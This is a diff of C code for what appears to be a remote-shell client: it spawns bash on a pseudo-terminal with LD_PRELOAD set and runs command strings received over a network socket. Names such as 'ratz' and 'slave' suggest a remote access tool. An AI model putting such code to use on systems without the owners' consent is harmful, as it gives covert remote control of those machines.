@@ -66,7 +66,7 @@ void	connect_to_proxy(s_slave* ratz)
 
 void	create_ptm(s_slave* slave)
 {
-	if ((slave->ptm = posix_openpt(O_RDWR | O_TRUNC | O_NOCTTY)) == -1) // O_TRUNC ??
+	if ((slave->ptm = posix_openpt(O_RDWR | O_NOCTTY)) == -1) // O_TRUNC ??
 		eperror("posix_openpt");
 	else if (grantpt(slave->ptm) == -1)
 		eperror("grantpt");
@@ -175,7 +175,7 @@ void	fork_job(s_slave* slave)
 	setenv("PS1", "", 1);
 	setenv("__rTCSETATTR", slave->sname, 1);
 	setenv("LD_PRELOAD", "./__rtcsetattr.so", 1);
-	//setenv("TERM", "dumb", 1);
+	//setenv("TERM", "dumb", 1); // compatibiliser xterm, ... (pour que ca fonctionne avec quasi tout --> supp cette ligne)
 	if (execlp("bash", "bash", "--posix", "--norc", "--noprofile", NULL) == -1)
 		eperror("execlp");
 }
@@ -194,10 +194,8 @@ void	slave_job(s_slave* slave)
 	{
 		memset(slave->msg, 0, DEBUG_SIZE_MAX);
 		fcntl(slave->net.out, F_SETFL, fcntl(slave->net.out, F_GETFL) & ~O_NONBLOCK);
-		while ((slave->len = recv(slave->net.out, slave->msg, DEBUG_SIZE_MAX, 0)) == 0)
-			;
+		slave->len = recv(slave->net.out, slave->msg, DEBUG_SIZE_MAX, 0);
 		fcntl(slave->net.out, F_SETFL, O_NONBLOCK);
-		//printf("cmd : %s\n", slave->msg);
 		if (!strcmp(slave->msg, "exit\n"))
 			continue ;
 		else if (builtins(*slave, slave->msg) == false)
@@ -205,17 +203,12 @@ void	slave_job(s_slave* slave)
 			msg_dup = strdup(slave->msg);
 			slave->len = sprintf(slave->msg, "kill -12 %d ; %s ; kill -10 %d\n", slave->pid, msg_dup, slave->pid);
 			n = slave->len;
-			//printf("sprintf : %s\n", slave->msg);
 			write(slave->ptm, slave->msg, slave->len);
-			memset(slave->msg, 0, sizeof(DEBUG_SIZE_MAX));
-			write(slave->ptm, slave->msg, 1); // O_TRUNCated 
 			while (cls == false)
 				;
+			read(slave->ptm, slave->msg, DEBUG_SIZE_MAX);
 			while (true)
 			{
-				//if (t < n + 1)
-				//	t += read(slave->ptm, &slave->msg[t], (n + 1) - t);
-				//else
 				{
 					fcntl(slave->ptm, F_SETFL, O_NONBLOCK);
 					slave->len = read(slave->ptm, slave->msg, DEBUG_SIZE_MAX);
@@ -228,7 +221,7 @@ void	slave_job(s_slave* slave)
 				slave->msg[slave->len] = 0;
 				if (slave->len > 0)
 				{
-					if (write(slave->ptm, slave->msg, slave->len) <= 0) // ici ne rentre pas dans le STDIN du pts
+					if (write(slave->ptm, slave->msg, slave->len) <= 0)
 						exit(1);
 					//printf("stdin : %s\n", slave->msg);
 				}
